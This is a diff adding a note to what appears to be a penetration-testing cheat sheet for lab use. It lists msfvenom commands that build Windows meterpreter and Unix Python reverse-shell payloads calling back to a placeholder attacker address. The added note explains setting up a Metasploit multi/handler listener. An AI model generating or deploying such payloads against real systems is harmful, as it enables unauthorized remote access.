@@ -25,3 +25,6 @@
 > msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp
 - Python
 > msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py
+
+### Note: All of the examples above are reverse payloads. This means we need to have the exploit/multi/handler module listening on attacking/local machine to work as a handler, need to set up the handler accordingly with the payload, LHOST and LPORT parameters. These values will be the same we have used when creating the msfvenom payload.
+
